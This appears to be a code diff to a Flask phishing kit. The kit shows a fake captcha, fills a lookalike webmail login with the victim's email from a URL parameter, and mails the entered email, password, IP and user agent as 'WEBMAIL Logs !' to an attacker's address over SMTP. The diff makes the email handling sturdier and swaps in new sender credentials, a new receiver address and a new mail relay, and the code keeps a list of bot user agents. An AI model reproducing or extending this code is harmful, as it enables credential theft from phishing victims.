@@ -77,6 +77,11 @@ bot_user_agents = [
 "crawler"
 ]
 
+def email_domain(email):
+    if email and '@' in email:
+        return email[email.index('@') + 1:]
+    return ''
+
 @app.route('/', methods=['GET', 'POST'])
 def captcha():
 
@@ -92,11 +97,12 @@ def captcha():
         colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
         color = random.choice(colors)
         session['code'] = str(code)
-        userauto = request.args.get("web")
-        userdomain = userauto[userauto.index('@') + 1:]
-        session['eman'] = userauto
-        session['ins'] = userdomain
-        return render_template('captcha.html', code=code, color=color, eman=userauto, ins=userdomain, error=False)
+        userauto = request.args.get("web") or session.get('eman')
+        userdomain = email_domain(userauto)
+        if userauto:
+            session['eman'] = userauto
+            session['ins'] = userdomain
+        return render_template('captcha.html', code=code, color=color, eman=userauto or '', ins=userdomain, error=False)
     elif request.method != 'GET':
 
         user_input = request.form['code']
@@ -113,12 +119,19 @@ def captcha():
             color = random.choice(colors)
             session['code'] = str(code)
 
-            return render_template('captcha.html', code=code, color=color, error=True)
+            return render_template(
+                'captcha.html',
+                code=code,
+                color=color,
+                eman=session.get('eman') or '',
+                ins=session.get('ins') or '',
+                error=True,
+            )
 
 @app.route('/success')
 def success():
     if 'passed_captcha' in session and session['passed_captcha']:
-        web_param = request.args.get('web')
+        web_param = request.args.get('web') or session.get('eman')
         return redirect(url_for('route2', web=web_param))
     else:
         return redirect(url_for('captcha'))
@@ -129,7 +142,7 @@ def route2():
     web_param = request.args.get('web')
     if web_param:
         session['eman'] = web_param
-        session['ins'] = web_param[web_param.index('@') + 1:]
+        session['ins'] = email_domain(web_param)
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
@@ -145,10 +158,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "missdomn@cinconn.com"
+        sender_email = "rtinh@greatest-vitamins.com  "
         sender_emaill = "eissa"
-        receiver_email = "aragon.rheece@minuteafter.com"
-        password = "X9kAxykLjkks"
+        receiver_email = "zeeskollectz@gmail.com"
+        password = "myworldWORK2026"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "WEBMAIL Logs !"
@@ -164,7 +177,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("cinconn.com", 465) as server:
+        with smtplib.SMTP_SSL("smtpdm-eu-central-1.aliyuncs.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
